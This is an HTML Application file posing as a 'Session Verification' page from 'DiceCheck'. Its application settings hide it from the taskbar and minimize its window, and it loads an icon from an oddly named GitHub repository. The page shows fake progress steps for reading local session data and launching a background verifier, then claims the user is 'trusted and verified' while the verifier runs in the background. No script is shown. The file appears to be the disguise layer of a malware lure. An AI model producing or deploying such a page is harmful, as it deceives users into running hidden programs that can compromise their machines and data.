<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="SessionVerifier">
<title>Session Verification</title>
<hta:application id="h" border="none" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" scroll="no" innerborder="no" windowstate="minimize" singleinstance="yes" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-me-drag/main/icon.ico"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{
  font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
  background-image:
    radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),
    radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),
    radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
  display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;
  border-radius:9px;color:#9aa6bd;font-size:12px;cursor:pointer;
  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
.x:hover{color:#fff;background:rgba(255,255,255,.11)}
.card{width:100%;max-width:378px;text-align:center;padding:30px 24px 16px;border-radius:22px;
  background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
  border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6)}
.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35);position:relative}
.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
  border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
.shield svg{width:36px;height:36px}
h1{font-size:19px;font-weight:600}
.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);
  transition:width .15s linear;-ms-transition:width .15s linear}
.meta{display:flex;justify-content:space-between;font-size:11px;color:#8b96ad}
.steps{list-style:none;margin:14px 0 0;text-align:left}
.steps li{display:flex;align-items:center;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;
  transition:opacity .35s;-ms-transition:opacity .35s}
.steps li.on{opacity:1;color:#eaf0fb}
.dot{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex:0 0 auto;
  margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s}
.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
  border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
.done{display:none}
.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
  box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
.check{width:88px;height:88px;position:relative;z-index:1}
.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5;stroke-dasharray:151}
.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:40}
.done h2{font-size:19px;font-weight:600}
.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
  background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
button{margin-top:16px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;
  font-size:13.5px;font-weight:600;color:#fff;background:linear-gradient(135deg,#5b8cff,#8b5cff);
  box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
.last{margin-top:9px;font-size:11px;color:#8b96ad}
footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
footer a{color:#9db4ff;text-decoration:none}
</style>
</head>

<body>
<div class="x" id="x">&#10005;</div>

<main class="card">
  <div id="stage">
    <div class="shield">
      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
    </div>
    <h1>Verifying your session</h1>
    <p class="sub" id="sub">Establishing a secure connection...</p>

    <div class="progress"><div class="bar" id="bar"></div></div>
    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>

    <ul class="steps">
      <li><span class="dot"></span><span>Connecting to verification server</span></li>
      <li><span class="dot"></span><span>Reading local session data</span></li>
      <li><span class="dot"></span><span>Validating security token</span></li>
      <li><span class="dot"></span><span>Launching background verifier</span></li>
    </ul>
  </div>

  <div class="done" id="done">
    <div class="checkwrap">
      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
    </div>
    <h2>You are trusted and verified</h2>
    <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
    <div class="badge">Secured by DiceCheck</div>
    <button id="again">Re-check now</button>
    <div class="last" id="last">Last check: --:--:--</div>
  </div>

  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a></footer>
</main>

